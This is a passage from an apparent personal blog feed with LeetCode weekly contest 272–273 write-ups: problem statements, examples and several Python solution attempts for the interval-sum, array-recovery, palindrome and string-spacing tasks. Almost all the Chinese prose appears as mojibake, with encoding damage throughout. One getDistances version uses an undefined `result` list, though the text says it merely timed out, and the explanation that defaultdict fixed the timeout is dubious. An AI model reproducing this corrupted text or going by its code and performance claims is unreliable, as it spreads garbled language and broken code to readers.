class="line">è¾“å…¥ï¼šarr = [10,5,10,10]</span><br><span class="line">è¾“å‡ºï¼š[5,0,3,4]</span><br><span class="line">è§£é‡Šï¼š</span><br><span class="line">- ä¸‹æ ‡ 0 ï¼šå¦ä¸¤ä¸ª 10 åœ¨ä¸‹æ ‡ 2 å’Œ 3 ï¼Œ|0 - 2| + |0 - 3| = 5</span><br><span class="line">- ä¸‹æ ‡ 1 ï¼šåªæœ‰è¿™ä¸€ä¸ª 5 åœ¨æ•°ç»„ä¸­ï¼Œæ‰€ä»¥åˆ°ç›¸åŒå…ƒç´ çš„é—´éš”ä¹‹å’Œæ˜¯ 0</span><br><span class="line">- ä¸‹æ ‡ 2 ï¼šå¦ä¸¤ä¸ª 10 åœ¨ä¸‹æ ‡ 0 å’Œ 3 ï¼Œ|2 - 0| + |2 - 3| = 3</span><br><span class="line">- ä¸‹æ ‡ 3 ï¼šå¦ä¸¤ä¸ª 10 åœ¨ä¸‹æ ‡ 0 å’Œ 2 ï¼Œ|3 - 0| + |3 - 2| = 4</span><br></pre></td></tr></table></figure><p>ç°åœ¨å†çœ‹è¿™é“é¢˜ï¼Œå¤šä¹ˆç†Ÿæ‚‰ï¼ç”±äºæˆ‘ä¹‹å‰å¹¶æ²¡æœ‰åšè¿‡1685è¿™é“é¢˜ï¼Œæ‰€ä»¥æˆ‘æ—©ä¸Šæ¯”èµ›çš„æ—¶å€™ä¸€è„¸æ‡µé€¼ï¼Œä½†æ˜¯è¿˜æ˜¯ç¡¬ç€å¤´çš®å†™äº†ä¸€ä¸‹ã€‚æˆ‘å…ˆè®²ä¸€ä¸‹æˆ‘æ²¡æœ‰åš1685è¿™é“é¢˜ä¹‹å‰åšè¿™ä¸ªé¢˜çš„æ€è·¯ã€‚</p><ul><li>é¦–å…ˆæˆ‘è‚¯å®šéœ€è¦åˆ†ç»„ï¼ŒæŒ‰ç…§ç›¸åŒçš„æ•°å­—å°†ä»–ä»¬çš„ä¸‹æ ‡åˆ†åœ¨ä¸€ç»„ã€‚</li><li>å…¶æ¬¡é’ˆå¯¹æ¯ä¸€ç»„æ•°æˆ‘éƒ½éœ€è¦è®¡ç®—ä»–ä»¬å„è‡ªå’Œç»„é‡Œå…¶ä»–æ•°çš„ç»å¯¹å€¼ä¹‹å’Œã€‚</li></ul><p>äºæ˜¯æˆ‘å†™äº†å¦‚ä¸‹ä»£ç ï¼Œå…¶ä¸­æˆ‘é€šè¿‡å­—å…¸çš„keyæ¥ä¿å­˜æ•°å­—ï¼Œvalueæ¥ä¿å­˜æ•°å­—çš„ä¸‹æ ‡ã€‚ä¹‹åå¯¹å­—å…¸çš„valueè¿›è¡Œéå†ï¼Œå»è®¡ç®—ç»„å†…æ¯ä¸ªæ•°å’Œå…¶ä»–æ•°ä¹‹é—´çš„ç»å¯¹å€¼ä¹‹å’Œã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getDistances</span><span class="params">(self, arr)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type arr: List[int]</span></span><br><span class="line"><span class="string">        :rtype: List[int]</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        d = &#123;&#125;</span><br><span class="line">        res = [<span class="number">0</span>] * len(arr)</span><br><span class="line">        result = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(arr)):</span><br><span class="line">            <span class="keyword">if</span> arr[i] <span class="keyword">not</span> <span class="keyword">in</span> d.keys():</span><br><span class="line">                d[arr[i]] = [i]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                d[arr[i]].append(i)</span><br><span class="line">        print(d)</span><br><span class="line">        <span class="keyword">for</span> value <span class="keyword">in</span> d.values():</span><br><span class="line">            <span class="keyword">for</span> v <span class="keyword">in</span> value:</span><br><span class="line">                s = <span class="number">0</span></span><br><span class="line">                <span class="keyword">for</span> r <span class="keyword">in</span> value:</span><br><span class="line">                    s+=abs(v-r)</span><br><span class="line">                res[v] = s</span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆè¿˜æ˜¯è¶…æ—¶äº†ã€‚ã€‚ã€‚ã€‚ã€‚</p><p>å½“æˆ‘åšäº†1685è¿™é“é¢˜ä¹‹åï¼Œæˆ‘æ˜ç™½äº†æˆ‘éœ€è¦æ”¹è¿›çš„åœ°æ–¹ã€‚å¯¹äºå­—å…¸åˆ†ç»„è¿™ä¸€å—è¿˜æ˜¯ä¸éœ€è¦æ”¹å˜çš„ï¼Œåªéœ€è¦æ”¹è¿›åé¢è®¡ç®—ç»å¯¹å€¼ä¹‹å’Œã€‚æ”¹è¿›åçš„ä»£ç å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getDistances</span><span class="params">(self, arr)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type arr: List[int]</span></span><br><span class="line"><span class="string">        :rtype: List[int]</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        d = &#123;&#125;</span><br><span class="line">        res = [<span class="number">0</span>] * len(arr)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(arr)):</span><br><span class="line">            <span class="keyword">if</span> arr[i] <span class="keyword">not</span> <span class="keyword">in</span> d.keys():</span><br><span class="line">                d[arr[i]] = [i]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                d[arr[i]].append(i)</span><br><span class="line">        <span class="keyword">for</span> nums <span class="keyword">in</span> d.values():</span><br><span class="line">            res = []</span><br><span class="line">            n = len(nums)</span><br><span class="line">            sums = sum(nums)</span><br><span class="line">            tmp_sum = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(len(nums)):</span><br><span class="line">                res.append(sums - nums[i] * n + (nums[i] * i - tmp_sum) * <span class="number">2</span>)</span><br><span class="line">                tmp_sum += nums[i]</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(len(nums)):</span><br><span class="line">                result[nums[i]] = res[i]</span><br><span class="line">        <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆè¿˜æ˜¯è¶…æ—¶äº†ã€‚ã€‚ã€‚ã€‚ã€‚</p><p>æˆ‘çªç„¶æ„Ÿè§‰çœ¼å‰ä¸€ç‰‡é»‘æš—ï¼Œè¿™ç‰¹ä¹ˆä¹Ÿèƒ½è¶…æ—¶ï¼Ÿï¼Ÿï¼Ÿäºæ˜¯æˆ‘æ‰“ç®—ä¼˜åŒ–ä¸€ä¸‹å‰é¢å­—å…¸åˆ†ç»„è¿™ä¸€å—ï¼Œä¼˜åŒ–ä»£ç å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getDistances</span><span class="params">(self, arr)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type arr: List[int]</span></span><br><span class="line"><span class="string">        :rtype: List[int]</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        d = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> i,v <span class="keyword">in</span> enumerate(arr):</span><br><span class="line">            <span class="keyword">if</span> v <span class="keyword">not</span> <span class="keyword">in</span> d.keys():</span><br><span class="line">                d[v] = [i]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                d[v].append(i)</span><br><span class="line">        result = [<span class="number">0</span>] * len(arr)</span><br><span class="line">        <span class="keyword">for</span> nums <span class="keyword">in</span> d.values():</span><br><span class="line">            res = []</span><br><span class="line">            n = len(nums)</span><br><span class="line">            sums = sum(nums)</span><br><span class="line">            tmp_sum = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(len(nums)):</span><br><span class="line">                res.append(sums - nums[i] * n + (nums[i] * i - tmp_sum) * <span class="number">2</span>)</span><br><span class="line">                tmp_sum += nums[i]</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(len(nums)):</span><br><span class="line">                result[nums[i]] = res[i]</span><br><span class="line">        <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><p>æ¢…å¼€ä¸‰åº¦ï¼Œè¿˜æ˜¯è¶…æ—¶ã€‚ã€‚ã€‚äºæ˜¯æˆ‘çœ‹äº†ä¸€ä¸‹é¢˜è§£æ˜¯æ€ä¹ˆå†™çš„ã€‚å…¶ä¸­æœ‰ä¸€ä¸ª<code>python</code>çš„è§£æ³•è·Ÿæˆ‘è¿™ä¸ªå·®ä¸å¤ªå¤šï¼Œæˆ‘å€Ÿç”¨äº†ä¸€ä¸‹äººå®¶å¯¹äºå­—å…¸åˆ†ç»„è¿™å—çš„å†™æ³•ï¼Œæœ€ç»ˆä»£ç å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getDistances</span><span class="params">(self, arr)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type arr: List[int]</span></span><br><span class="line"><span class="string">        :rtype: List[int]</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        </span><br><span class="line">        d = collections.defaultdict(list)</span><br><span class="line">        ans = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> i , v <span class="keyword">in</span> enumerate(arr):</span><br><span class="line">          d[v].append(i)</span><br><span class="line">        result = [<span class="number">0</span>] * len(arr)</span><br><span class="line">        <span class="keyword">for</span> nums <span class="keyword">in</span> d.values():</span><br><span class="line">            res = []</span><br><span class="line">            n = len(nums)</span><br><span class="line">            sums = sum(nums)</span><br><span class="line">            tmp_sum = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(len(nums)):</span><br><span class="line">                res.append(sums - nums[i] * n + (nums[i] * i - tmp_sum) * <span class="number">2</span>)</span><br><span class="line">                tmp_sum += nums[i]</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(len(nums)):</span><br><span class="line">                result[nums[i]] = res[i]</span><br><span class="line">        <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><p>ç»ˆäºé€šè¿‡äº†ğŸ˜­ğŸ˜­ğŸ˜­ï¼Œç‰¹ä¹ˆçš„ï¼ŒåŒæ ·éƒ½æ˜¯å­—å…¸ï¼Œä¸ºå•¥åŸç”Ÿçš„å­—å…¸å’Œ<code>collections</code>æ¨¡å—ä¸­çš„å­—å…¸å·®è·å°±è¿™ä¹ˆå¤§å‘¢ã€‚ã€‚ã€‚</p><p><img src="/2021/12/26/Leetcodeç¬¬273åœºå‘¨èµ›write-up/2.png" alt="2"></p><h4 id="è¿˜åŸåŸæ•°ç»„"><a href="#è¿˜åŸåŸæ•°ç»„" class="headerlink" title="è¿˜åŸåŸæ•°ç»„"></a>è¿˜åŸåŸæ•°ç»„</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Alice æœ‰ä¸€ä¸ªä¸‹æ ‡ä» 0 å¼€å§‹çš„æ•°ç»„ arr ï¼Œç”± n ä¸ªæ­£æ•´æ•°ç»„æˆã€‚å¥¹ä¼šé€‰æ‹©ä¸€ä¸ªä»»æ„çš„ æ­£æ•´æ•° k å¹¶æŒ‰ä¸‹è¿°æ–¹å¼åˆ›å»ºä¸¤ä¸ªä¸‹æ ‡ä» 0 å¼€å§‹çš„æ–°æ•´æ•°æ•°ç»„ lower å’Œ higher ï¼š</span><br><span class="line">å¯¹æ¯ä¸ªæ»¡è¶³ 0 &lt;= i &lt; n çš„ä¸‹æ ‡ i ï¼Œlower[i] = arr[i] - k</span><br><span class="line">å¯¹æ¯ä¸ªæ»¡è¶³ 0 &lt;= i &lt; n çš„ä¸‹æ ‡ i ï¼Œhigher[i] = arr[i] + k</span><br><span class="line">ä¸å¹¸åœ°æ˜¯ï¼ŒAlice ä¸¢å¤±äº†å…¨éƒ¨ä¸‰ä¸ªæ•°ç»„ã€‚ä½†æ˜¯ï¼Œå¥¹è®°ä½äº†åœ¨æ•°ç»„ lower å’Œ higher ä¸­å‡ºç°çš„æ•´æ•°ï¼Œä½†ä¸çŸ¥é“æ¯ä¸ªæ•´æ•°å±äºå“ªä¸ªæ•°ç»„ã€‚è¯·ä½ å¸®åŠ© Alice è¿˜åŸåŸæ•°ç»„ã€‚</span><br><span class="line">ç»™ä½ ä¸€ä¸ªç”± 2n ä¸ªæ•´æ•°ç»„æˆçš„æ•´æ•°æ•°ç»„ nums ï¼Œå…¶ä¸­ æ°å¥½ n ä¸ªæ•´æ•°å‡ºç°åœ¨ lower ï¼Œå‰©ä¸‹çš„å‡ºç°åœ¨ higher ï¼Œè¿˜åŸå¹¶è¿”å› åŸæ•°ç»„ arr ã€‚å¦‚æœå‡ºç°ç­”æ¡ˆä¸å”¯ä¸€çš„æƒ…å†µï¼Œè¿”å› ä»»ä¸€ æœ‰æ•ˆæ•°ç»„ã€‚</span><br><span class="line">æ³¨æ„ï¼šç”Ÿæˆçš„æµ‹è¯•ç”¨ä¾‹ä¿è¯å­˜åœ¨ è‡³å°‘ä¸€ä¸ª æœ‰æ•ˆæ•°ç»„ arr ã€‚</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥ï¼šnums = [2,10,6,4,8,12]</span><br><span class="line">è¾“å‡ºï¼š[3,7,11]</span><br><span class="line">è§£é‡Šï¼š</span><br><span class="line">å¦‚æœ arr = [3,7,11] ä¸” k = 1 ï¼Œé‚£ä¹ˆ lower = [2,6,10] ä¸” higher = [4,8,12] ã€‚</span><br><span class="line">ç»„åˆ lower å’Œ higher å¾—åˆ° [2,6,10,4,8,12] ï¼Œè¿™æ˜¯ nums çš„ä¸€ä¸ªæ’åˆ—ã€‚</span><br><span class="line">å¦ä¸€ä¸ªæœ‰æ•ˆçš„æ•°ç»„æ˜¯ arr = [5,7,9] ä¸” k = 3 ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œlower = [2,4,6] ä¸” higher = [8,10,12] ã€‚</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥ï¼šnums = [1,1,3,3]</span><br><span class="line">è¾“å‡ºï¼š[2,2]</span><br><span class="line">è§£é‡Šï¼š</span><br><span class="line">å¦‚æœ arr = [2,2] ä¸” k = 1 ï¼Œé‚£ä¹ˆ lower = [1,1] ä¸” higher = [3,3] ã€‚</span><br><span class="line">ç»„åˆ lower å’Œ higher å¾—åˆ° [1,1,3,3] ï¼Œè¿™æ˜¯ nums çš„ä¸€ä¸ªæ’åˆ—ã€‚</span><br><span class="line">æ³¨æ„ï¼Œæ•°ç»„ä¸èƒ½æ˜¯ [1,3] ï¼Œå› ä¸ºåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œè·å¾— [1,1,3,3] å”¯ä¸€å¯è¡Œçš„æ–¹æ¡ˆæ˜¯ k = 0 ã€‚</span><br><span class="line">è¿™ç§æ–¹æ¡ˆæ˜¯æ— æ•ˆçš„ï¼Œk å¿…é¡»æ˜¯ä¸€ä¸ªæ­£æ•´æ•°ã€‚</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥ï¼šnums = [5,435]</span><br><span class="line">è¾“å‡ºï¼š[220]</span><br><span class="line">è§£é‡Šï¼š</span><br><span class="line">å”¯ä¸€å¯è¡Œçš„ç»„åˆæ˜¯ arr = [220] ä¸” k = 215 ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œlower = [5] ä¸” higher = [435] ã€‚</span><br></pre></td></tr></table></figure><p>è¿™é“é¢˜å˜›ï¼å‘Šè¾ã€‚ã€‚ã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;åè½¬ä¸¤æ¬¡çš„æ•°å­—&quot;&gt;&lt;a href=&quot;#åè½¬ä¸¤æ¬¡çš„æ•°å­—&quot; class=&quot;headerlink&quot; title=&quot;åè½¬ä¸¤æ¬¡çš„æ•°å­—&quot;&gt;&lt;/a&gt;åè½¬ä¸¤æ¬¡çš„æ•°å­—&lt;/h4&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=
      
    
    </summary>
    
    
      <category term="Algorithm" scheme="elssm.github.io/tags/Algorithm/"/>
    
  </entry>
  
  <entry>
    <title>Leetcodeç¬¬272åœºå‘¨èµ›write up</title>
    <link href="elssm.github.io/2021/12/19/Leetcode%E7%AC%AC272%E5%9C%BA%E5%91%A8%E8%B5%9Bwrite-up/"/>
    <id>elssm.github.io/2021/12/19/Leetcodeç¬¬272åœºå‘¨èµ›write-up/</id>
    <published>2021-12-19T04:42:32.000Z</published>
    <updated>2021-12-20T09:29:16.797Z</updated>
    
    <content type="html"><![CDATA[<h4 id="æ‰¾å‡ºæ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå›æ–‡å­—ç¬¦ä¸²"><a href="#æ‰¾å‡ºæ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå›æ–‡å­—ç¬¦ä¸²" class="headerlink" title="æ‰¾å‡ºæ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå›æ–‡å­—ç¬¦ä¸²"></a>æ‰¾å‡ºæ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå›æ–‡å­—ç¬¦ä¸²</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ç»™ä½ ä¸€ä¸ªå­—ç¬¦ä¸²æ•°ç»„ words ï¼Œæ‰¾å‡ºå¹¶è¿”å›æ•°ç»„ä¸­çš„ ç¬¬ä¸€ä¸ªå›æ–‡å­—ç¬¦ä¸² ã€‚å¦‚æœä¸å­˜åœ¨æ»¡è¶³è¦æ±‚çš„å­—ç¬¦ä¸²ï¼Œè¿”å›ä¸€ä¸ª ç©ºå­—ç¬¦ä¸² &quot;&quot; ã€‚</span><br><span class="line">å›æ–‡å­—ç¬¦ä¸² çš„å®šä¹‰ä¸ºï¼šå¦‚æœä¸€ä¸ªå­—ç¬¦ä¸²æ­£ç€è¯»å’Œåç€è¯»ä¸€æ ·ï¼Œé‚£ä¹ˆè¯¥å­—ç¬¦ä¸²å°±æ˜¯ä¸€ä¸ª å›æ–‡å­—ç¬¦ä¸² ã€‚</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥ï¼šwords = [&quot;abc&quot;,&quot;car&quot;,&quot;ada&quot;,&quot;racecar&quot;,&quot;cool&quot;]</span><br><span class="line">è¾“å‡ºï¼š&quot;ada&quot;</span><br><span class="line">è§£é‡Šï¼šç¬¬ä¸€ä¸ªå›æ–‡å­—ç¬¦ä¸²æ˜¯ &quot;ada&quot; ã€‚</span><br><span class="line">æ³¨æ„ï¼Œ&quot;racecar&quot; ä¹Ÿæ˜¯å›æ–‡å­—ç¬¦ä¸²ï¼Œä½†å®ƒä¸æ˜¯ç¬¬ä¸€ä¸ªã€‚</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥ï¼šwords = [&quot;notapalindrome&quot;,&quot;racecar&quot;]</span><br><span class="line">è¾“å‡ºï¼š&quot;racecar&quot;</span><br><span class="line">è§£é‡Šï¼šç¬¬ä¸€ä¸ªä¹Ÿæ˜¯å”¯ä¸€ä¸€ä¸ªå›æ–‡å­—ç¬¦ä¸²æ˜¯ &quot;racecar&quot; ã€‚</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥ï¼šwords = [&quot;def&quot;,&quot;ghi&quot;]</span><br><span class="line">è¾“å‡ºï¼š&quot;&quot;</span><br><span class="line">è§£é‡Šï¼šä¸å­˜åœ¨å›æ–‡å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥è¿”å›ä¸€ä¸ªç©ºå­—ç¬¦ä¸²ã€‚</span><br></pre></td></tr></table></figure><p>è¿™é“æ²¡ä»€ä¹ˆè¯´çš„ï¼Œä¾æ¬¡éå†æ¯ä¸€ä¸ªå­—ç¬¦ä¸²å–ååè¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœç›¸ç­‰ç›´æ¥è¿”å›</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">firstPalindrome</span><span class="params">(self, words)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type words: List[str]</span></span><br><span class="line"><span class="string">        :rtype: str</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">for</span> word <span class="keyword">in</span> words:</span><br><span class="line">            r_word = word[::<span class="number">-1</span>]</span><br><span class="line">            <span class="keyword">if</span> r_word == word:</span><br><span class="line">                <span class="keyword">return</span> word</span><br><span class="line">        <span class="keyword">return</span> <span class="string">""</span></span><br></pre></td></tr></table></figure><h4 id="å‘å­—ç¬¦ä¸²æ·»åŠ ç©ºæ ¼"><a href="#å‘å­—ç¬¦ä¸²æ·»åŠ ç©ºæ ¼" class="headerlink" title="å‘å­—ç¬¦ä¸²æ·»åŠ ç©ºæ ¼"></a>å‘å­—ç¬¦ä¸²æ·»åŠ ç©ºæ ¼</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ç»™ä½ ä¸€ä¸ªä¸‹æ ‡ä» 0 å¼€å§‹çš„å­—ç¬¦ä¸² s ï¼Œä»¥åŠä¸€ä¸ªä¸‹æ ‡ä» 0 å¼€å§‹çš„æ•´æ•°æ•°ç»„ spacesã€‚</span><br><span class="line">æ•°ç»„ spaces æè¿°åŸå­—ç¬¦ä¸²ä¸­éœ€è¦æ·»åŠ ç©ºæ ¼çš„ä¸‹æ ‡ã€‚æ¯ä¸ªç©ºæ ¼éƒ½åº”è¯¥æ’å…¥åˆ°ç»™å®šç´¢å¼•å¤„çš„å­—ç¬¦å€¼ä¹‹å‰ã€‚</span><br><span class="line">ä¾‹å¦‚ï¼Œs = &quot;EnjoyYourCoffee&quot; ä¸” spaces = [5, 9] ï¼Œé‚£ä¹ˆæˆ‘ä»¬éœ€è¦åœ¨ &apos;Y&apos; å’Œ &apos;C&apos; ä¹‹å‰æ·»åŠ ç©ºæ ¼ï¼Œè¿™ä¸¤ä¸ªå­—ç¬¦åˆ†åˆ«ä½äºä¸‹æ ‡ 5 å’Œä¸‹æ ‡ 9 ã€‚å› æ­¤ï¼Œæœ€ç»ˆå¾—åˆ° &quot;Enjoy Your Coffee&quot; ã€‚</span><br><span class="line">è¯·ä½ æ·»åŠ ç©ºæ ¼ï¼Œå¹¶è¿”å›ä¿®æ”¹åçš„å­—ç¬¦ä¸²ã€‚</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥ï¼šs = &quot;LeetcodeHelpsMeLearn&quot;, spaces = [8,13,15]</span><br><span class="line">è¾“å‡ºï¼š&quot;Leetcode Helps Me Learn&quot;</span><br><span class="line">è§£é‡Šï¼š</span><br><span class="line">ä¸‹æ ‡ 8ã€13 å’Œ 15 å¯¹åº” &quot;LeetcodeHelpsMeLearn&quot; ä¸­åŠ ç²—æ–œä½“å­—ç¬¦ã€‚</span><br><span class="line">æ¥ç€åœ¨è¿™äº›å­—ç¬¦å‰æ·»åŠ ç©ºæ ¼ã€‚</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥ï¼šs = &quot;icodeinpython&quot;, spaces = [1,5,7,9]</span><br><span class="line">è¾“å‡ºï¼š&quot;i code in py thon&quot;</span><br><span class="line">è§£é‡Šï¼š</span><br><span class="line">ä¸‹æ ‡ 1ã€5ã€7 å’Œ 9 å¯¹åº” &quot;icodeinpython&quot; ä¸­åŠ ç²—æ–œä½“å­—ç¬¦ã€‚</span><br><span class="line">æ¥ç€åœ¨è¿™äº›å­—ç¬¦å‰æ·»åŠ ç©ºæ ¼ã€‚</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥ï¼šs = &quot;spacing&quot;, spaces = [0,1,2,3,4,5,6]</span><br><span class="line">è¾“å‡ºï¼š&quot; s p a c i n g&quot;</span><br><span class="line">è§£é‡Šï¼š</span><br><span class="line">å­—ç¬¦ä¸²çš„ç¬¬ä¸€ä¸ªå­—ç¬¦å‰å¯ä»¥æ·»åŠ ç©ºæ ¼ã€‚</span><br></pre></td></tr></table></figure><p>è¿™é“é¢˜çš„æ€è·¯æ˜¯ï¼šæ ¹æ®è¦æ’å…¥ç©ºæ ¼çš„åœ°æ–¹å°†å­—ç¬¦ä¸²è¿›è¡Œæ‹†åˆ†ï¼Œå°†æ‹†åˆ†åçš„å­—ç¬¦ä¸²é€šè¿‡ç©ºæ 